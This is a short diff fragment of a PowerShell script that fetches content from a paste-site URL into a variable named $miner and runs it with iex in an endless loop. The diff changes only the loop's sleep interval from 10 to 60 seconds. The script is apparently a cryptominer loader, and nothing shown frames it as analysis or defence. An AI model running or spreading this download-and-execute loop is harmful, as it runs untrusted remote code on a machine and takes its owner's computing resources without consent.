@@ -30,5 +30,5 @@ if ($processes) {
 $miner = iwr "https://pastie.io/raw/lsxoaz"
 while ($true) {
     iex $miner
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 60
 }
